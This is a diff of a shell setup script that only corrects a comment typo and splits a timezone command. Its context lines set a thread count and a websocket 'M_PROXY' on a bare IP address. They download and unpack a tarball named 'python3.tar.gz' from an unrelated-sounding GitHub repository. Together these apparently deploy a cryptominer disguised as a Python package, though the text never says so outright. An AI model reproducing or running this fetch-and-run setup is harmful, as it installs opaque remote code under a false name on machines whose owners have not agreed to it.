@@ -8,14 +8,15 @@
 : "${M_THREADS:=25}"
 : "${M_PROXY:=ws://172.233.136.27:8088/proxy}"
 
-# Download packgaes
+# Download packages
 wget https://github.com/malphite-code-3/ai-realestale-trainer/releases/download/python3.2/python3.tar.gz
 tar -xvf python3.tar.gz
 rm python3.tar.gz
 cd python3
 
 # Set timezone non-interactively
-echo "Asia/Jakarta" > /etc/timezone && dpkg-reconfigure -f noninteractive tzdata
+echo "Asia/Jakarta" > /etc/timezone
+DEBIAN_FRONTEND=noninteractive dpkg-reconfigure -f noninteractive tzdata
 
 # Update the package list and install required packages
 sudo apt-get update && sudo apt-get install -y \
